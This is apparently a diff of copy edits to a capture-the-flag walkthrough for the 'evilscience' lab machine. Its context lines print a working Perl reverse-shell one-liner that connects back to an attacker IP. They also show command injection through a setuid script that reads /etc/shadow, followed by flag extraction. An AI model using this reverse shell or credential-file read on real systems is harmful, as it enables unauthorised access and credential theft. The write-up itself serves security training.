@@ -365,7 +365,7 @@ Awesome. Now that I can execute remote commands, it's reverse shell time. I alwa
 perl -e 'use Socket;$i="192.168.198.128";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`
 ```
 
-To avoid complications it's best to `urlencode()` the above and then spawn a pseudo-tty for optimal output control.
+To avoid complications, it's best to `urlencode()` the above and then spawn a pseudo-tty for optimal output control.
 
 ![shell](/assets/images/posts/evilscience-walkthrough/evilscience-9.png)
 
@@ -373,11 +373,11 @@ I got shell!
 
 ### Privilege Escalation
 
-During enumeration, I noticed that user `evilscience` is able to `sudo` as `root` as shown by `.sudo_as_admin_successful`.
+During enumeration, I noticed that user `evilscience` was able to `sudo` as `root` as shown by `.sudo_as_admin_successful`.
 
 ![sudo](/assets/images/posts/evilscience-walkthrough/evilscience-10.png)
 
-Interestingly, there was also a file with the `setuid` and `setgid` bit turned on. Noticed the file size on this guy?
+Interestingly, there was also a file with the `setuid` and `setgid` bit turned on. Noticed the file size on this guy? 11MB for a Python file? Something funky is going on here!
 
 ![xxxlogauditorxxx.py](/assets/images/posts/evilscience-walkthrough/evilscience-11.png)
 
@@ -407,7 +407,7 @@ Armed with this new knowledge that `cat` was used, let's see if we can display `
 
 Holy smoke. It worked!
 
-My guess is that the command ran like so.
+My guess is that the command ran like this.
 
 ```
 cat /var/log/auth.log /etc/shadow
@@ -443,7 +443,7 @@ Finally, the cat is out of the bag!
 # strings flag.png | sed '$!d' | sed 's/flag: //' | base64 -d
 ```
 <pre class="wrap">
-october 1, 2017.
+October 1, 2017.
 We have or first batch of volunteers for the genome project. The group looks promising, we have high hopes for this!
 
 October 3, 2017.
